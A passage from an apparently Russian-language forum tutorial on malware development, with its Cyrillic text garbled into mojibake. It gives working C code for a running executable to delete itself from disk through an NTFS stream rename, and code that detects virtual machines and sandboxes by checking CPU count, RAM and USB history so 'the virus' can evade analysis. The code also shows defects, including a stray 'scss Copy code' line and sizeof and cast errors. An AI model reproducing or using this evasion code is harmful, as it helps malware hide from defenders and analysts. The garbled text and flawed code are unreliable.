–ü–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ SetFileInformationByHandle –≤ –ø–µ—Ä–≤—ã–π —Ä–∞–∑ –¥–ª—è –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ñ–∞–π–ª–∞ NTFS, –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–∫—Ä—ã—Ç –∏ –∑–∞—Ç–µ–º —Å–Ω–æ–≤–∞ –æ—Ç–∫—Ä—ã—Ç —Å –ø–æ–º–æ—â—å—é –¥—Ä—É–≥–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ CreateFile. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ñ–∞–π–ª–∞, —á—Ç–æ–±—ã –Ω–æ–≤—ã–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Å–æ–¥–µ—Ä–∂–∞–ª –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫ –¥–∞–Ω–Ω—ã—Ö.<br />
<br />
<b>–ó–∞–∫–ª—é—á–∏—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥ —Å–∞–º–æ—É–¥–∞–ª–µ–Ω–∏—è</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è DeleteSelf, –ø–æ–∫–∞–∑–∞–Ω–Ω–∞—è –Ω–∏–∂–µ, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –æ–ø–∏—Å–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ —Å –¥–∏—Å–∫–∞ –≤–æ –≤—Ä–µ–º—è –µ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–í–µ—Å—å –∫–æ–¥ –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –±—ã–ª —Ä–∞–Ω–µ–µ –æ–±—ä—è—Å–Ω–µ–Ω, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ GetModuleFileNameW WinAPI. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É, —Å–æ–¥–µ—Ä–∂–∞—â–µ–º—É —É–∫–∞–∑–∞–Ω–Ω—ã–π –º–æ–¥—É–ª—å. –ï—Å–ª–∏ –ø–µ—Ä–≤—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ NULL (–∫–∞–∫ –≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –∫–æ–¥–µ), —Ç–æ –æ–Ω–∞ –ø–æ–ª—É—á–∞–µ—Ç –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É —Ç–µ–∫—É—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ù–æ–≤–æ–µ –∏–º—è –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö
#define NEW_STREAM L&quot;:RuSfera&quot;

BOOL DeleteSelf() {

scss
Copy code
WCHAR                       szPath [MAX_PATH * 2] = { 0 };
FILE_DISPOSITION_INFO       Delete                = { 0 };
HANDLE                      hFile                 = INVALID_HANDLE_VALUE;
PFILE_RENAME_INFO           pRename               = NULL;
const wchar_t*              NewStream             = (const wchar_t*)NEW_STREAM;
SIZE_T                      sRename               = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);


// –í—ã–¥–µ–ª–µ–Ω–∏–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –¥–ª—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;FILE_RENAME_INFO&#039;
pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
if (!pRename) {
    printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

// –û—á–∏—Å—Ç–∫–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å—Ç—Ä—É–∫—Ç—É—Ä
ZeroMemory(szPath, sizeof(szPath));
ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

//----------------------------------------------------------------------------------------
// –ü–æ–º–µ—Ç–∫–∞ —Ñ–∞–π–ª–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–æ 2-–º –≤—ã–∑–æ–≤–µ SetFileInformationByHandle)
Delete.DeleteFile = TRUE;

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –±—É—Ñ–µ—Ä–∞ –Ω–æ–≤–æ–≥–æ –∏–º–µ–Ω–∏ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏ –µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ &#039;FILE_RENAME_INFO&#039;
pRename-&gt;FileNameLength = sizeof(NewStream);
RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

//----------------------------------------------------------------------------------------

// –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞
if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
    printf(&quot;[!] GetModuleFileNameW Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

//----------------------------------------------------------------------------------------
// –ü–ï–†–ï–ò–ú–ï–ù–û–í–ê–ù–ò–ï

// –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf(&quot;[!] CreateFileW [R] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

wprintf(L&quot;[i] Renaming :$DATA to %s  ...&quot;, NEW_STREAM);

// –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö
if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
    printf(&quot;[!] SetFileInformationByHandle [R] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}
wprintf(L&quot;[+] DONE \n&quot;);

CloseHandle(hFile);

//----------------------------------------------------------------------------------------
// –£–î–ê–õ–ï–ù–ò–ï

// –û—Ç–∫—Ä—ã—Ç–∏–µ –Ω–æ–≤–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf(&quot;[!] CreateFileW [D] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

wprintf(L&quot;[i] DELETING ...&quot;);

// –ü–æ–º–µ—Ç–∫–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ñ–∞–π–ª–∞
if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
    printf(&quot;[!] SetFileInformationByHandle [D] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}
wprintf(L&quot;[+] DONE \n&quot;);

CloseHandle(hFile);

//----------------------------------------------------------------------------------------

// –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞
HeapFree(GetProcessHeap(), 0, pRename);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è </b><br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω –ø—Ä–æ—Ü–µ—Å—Å SelfDeletion.exe, —Ä–∞–±–æ—Ç–∞—é—â–∏–π, —Ö–æ—Ç—è –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª –±—ã–ª —Å—Ç–µ—Ä—Ç —Å –¥–∏—Å–∫–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787251150.png"
		data-src="https://osint42.org/attachments/1746787251150-png.251/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787251150-png.251/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787251150.png"
			title="1746787251150.png"
			width="1749" height="746" loading="lazy" />
	</div></div>
						

							<h2>–û–±—Ö–æ–¥ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787426897.png"
		data-src="https://osint42.org/attachments/1746787426897-png.252/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787426897-png.252/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787426897.png"
			title="1746787426897.png"
			width="579" height="438" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –¥–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —Ç–µ—Ö–Ω–∏–∫–∏ –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏, –≤ —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –≤–∏—Ä—É—Å –ø—ã—Ç–∞—é—Ç—Å—è –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥–µ –∏–ª–∏ –ø–µ—Å–æ—á–Ω–∏—Ü–µ.<br />
<br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è</b><br />
<br />
–í –æ–±—â–µ–º —Å–ª—É—á–∞–µ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—ã –Ω–µ –∏–º–µ—é—Ç –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–º—É –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—é —Ö–æ—Å—Ç-–º–∞—à–∏–Ω—ã. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–ø–ø–∞—Ä–∞—Ç—É—Ä–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ–º –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ª–∏ –æ–Ω–æ –≤–Ω—É—Ç—Ä–∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥—ã –∏–ª–∏ –ø–µ—Å–æ—á–Ω–∏—Ü—ã. –£—á–∏—Ç—ã–≤–∞–π—Ç–µ, —á—Ç–æ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≥–∞—Ä–∞–Ω—Ç–∏–∏ –ø–æ–ª–Ω–æ–π —Ç–æ—á–Ω–æ—Å—Ç–∏, –ø–æ—Ç–æ–º—É —á—Ç–æ –º–∞—à–∏–Ω–∞ –º–æ–∂–µ—Ç –ø—Ä–æ—Å—Ç–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —Å –Ω–∏–∑–∫–∏–º–∏ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∞–º–∏ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è. –ü—Ä–æ–≤–µ—Ä—è–µ–º—ã–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è —Å–ª–µ–¥—É—é—â–∏–µ:<br />
<ol>
<li data-xf-list-type="ol">–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä (CPU) - –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –º–µ–Ω–µ–µ —á–µ–º 2 –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤.</li>
<li data-xf-list-type="ol">–û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å (RAM) - –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –º–µ–Ω–µ–µ —á–µ–º 2 –≥–∏–≥–∞–±–∞–π—Ç–æ–≤.</li>
<li data-xf-list-type="ol">–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–Ω–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ USB - –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –º–µ–Ω–µ–µ —á–µ–º 2 USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤.</li>
</ol><b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –¶–ü–£ </b><br />
<br />
–ü—Ä–æ–≤–µ—Ä–∫–∞ –¶–ü–£ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ GetSystemInfo WinAPI. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É SYSTEM_INFO, —Å–æ–¥–µ—Ä–∂–∞—â—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ, –≤–∫–ª—é—á–∞—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>SYSTEM_INFO SysInfo = { 0 };

GetSystemInfo(&amp;SysInfo);
if (SysInfo.dwNumberOfProcessors &lt; 2) {
    // –≤–æ–∑–º–æ–∂–Ω–æ, –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏ (RAM)</b><br />
<br />
–ü—Ä–æ–≤–µ—Ä–∫—É –¥–æ—Å—Ç—É–ø–Ω–æ–π –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ GlobalMemoryStatusEx WinAPI. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É MEMORYSTATUSEX, —Å–æ–¥–µ—Ä–∂–∞—â—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–µ–∫—É—â–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º–µ. –û–±—ä–µ–º –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ —á–µ—Ä–µ–∑ —á–ª–µ–Ω ullTotalPhys. –û–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–µ–∫—É—â–µ–π —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏ –≤ –±–∞–π—Ç–∞—Ö.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };

if (!GlobalMemoryStatusEx(&amp;MemStatus)) {
    printf(&quot;\n\t[!] GlobalMemoryStatusEx –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
}

if ((DWORD)MemStatus.ullTotalPhys &lt;= (DWORD)(2 * 1073741824)) {
    // –≤–æ–∑–º–æ–∂–Ω–æ, –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ
}</code></pre>
	</div>
</div><br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ 2 * 1073741824 - —ç—Ç–æ —Ä–∞–∑–º–µ—Ä –¥–≤—É—Ö –≥–∏–≥–∞–±–∞–π—Ç–æ–≤ –≤ –±–∞–π—Ç–∞—Ö.<br />
<br />
<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∏—Å–ª–∞ —Ä–∞–Ω–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤</b><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–Ω–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤ –≤ —Å–∏—Å—Ç–µ–º–µ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\USBSTOR. –ó–Ω–∞—á–µ–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–∞ –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–π RegOpenKeyExA –∏ RegQueryInfoKeyA WinAPI.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HKEY hKey = NULL;
DWORD dwUsbNumber = NULL;
DWORD dwRegErr = NULL;

if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, NULL, KEY_READ, &amp;hKey)) != ERROR_SUCCESS) {
    printf(&quot;\n\t[!] RegOpenKeyExA –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
}

if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &amp;dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
    printf(&quot;\n\t[!] RegQueryInfoKeyA –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
}

// –ú–µ–Ω–µ–µ 2 —Ä–∞–Ω–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤
if (dwUsbNumber &lt; 2) {
    // –≤–æ–∑–º–æ–∂–Ω–æ, –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è (–∫–æ–¥)</b><br />
<br />
–ü—Ä–µ–¥—ã–¥—É—â–∏–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã –∫–æ–¥–∞ –æ–±—ä–µ–¥–∏–Ω—è—é—Ç—Å—è –≤ –æ–¥–Ω—É —Ñ—É–Ω–∫—Ü–∏—é IsVenvByHardwareCheck. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ –æ–Ω–∞ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL IsVenvByHardwareCheck() {

    SYSTEM_INFO SysInfo = { 0 };
    MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };
    HKEY hKey = NULL;
    DWORD dwUsbNumber = NULL;
    DWORD dwRegErr = NULL;

    // –ü–†–û–í–ï–†–ö–ê –¶–ü–£
    GetSystemInfo(&amp;SysInfo);

    // –ú–µ–Ω–µ–µ 2 –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤
    if (SysInfo.dwNumberOfProcessors &lt; 2) {
        return TRUE;
    }

    // –ü–†–û–í–ï–†–ö–ê –û–ü–ï–†–ê–¢–ò–í–ù–û–ô –ü–ê–ú–Ø–¢–ò (RAM)
    if (!GlobalMemoryStatusEx(&amp;MemStatus)) {
        printf(&quot;\n\t[!] GlobalMemoryStatusEx –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ú–µ–Ω–µ–µ 2 –≥–± –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏
    if ((DWORD)MemStatus.ullTotalPhys &lt; (DWORD)(2 * 1073741824)) {
        return TRUE;
    }

    // –ü–†–û–í–ï–†–ö–ê –ö–û–õ–ò–ß–ï–°–¢–í–ê –†–ê–ù–ï–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ù–´–• USB-–£–°–¢–†–û–ô–°–¢–í
    if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, NULL, KEY_READ, &amp;hKey)) != ERROR_SUCCESS) {
        printf(&quot;\n\t[!] RegOpenKeyExA –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
        return FALSE;
    }

    if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &amp;dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
        printf(&quot;\n\t[!] RegQueryInfoKeyA –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
        return FALSE;
    }

    // –ú–µ–Ω–µ–µ 2 —Ä–∞–Ω–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤
    if (dwUsbNumber &lt; 2) {
        return TRUE;
    }

    RegCloseKey(hKey);

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –º–∞—à–∏–Ω—ã</b><br />
<br />
